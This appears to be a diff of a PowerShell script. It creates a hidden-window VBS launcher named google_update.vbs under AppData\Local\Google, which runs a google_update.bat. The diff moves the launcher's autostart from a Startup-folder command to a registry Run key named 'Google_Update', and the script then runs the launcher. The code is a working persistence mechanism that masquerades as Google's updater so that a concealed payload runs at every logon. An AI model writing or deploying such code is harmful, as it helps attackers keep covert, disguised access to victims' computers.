@@ -10,5 +10,5 @@ Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -value 'Set WshSh
 Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'WshShell.run """" & "C:\users\pyro\AppData\Local\Google\google_update.bat" & """", 0, False'
 Add-Content -Path $HOME\Appdata\Local\Google\google_update.vbs -Value 'Set WshShell = Nothing'
 $vbs_path = "$HOME\AppData\Local\Google\google_update.vbs"
-New-Item -Path "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name startup.cmd -Value "cscript $vbs_path"
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Google_Update" -Value "cscript $vbs_path" -PropertyType "String"
 cscript.exe $vbs_path
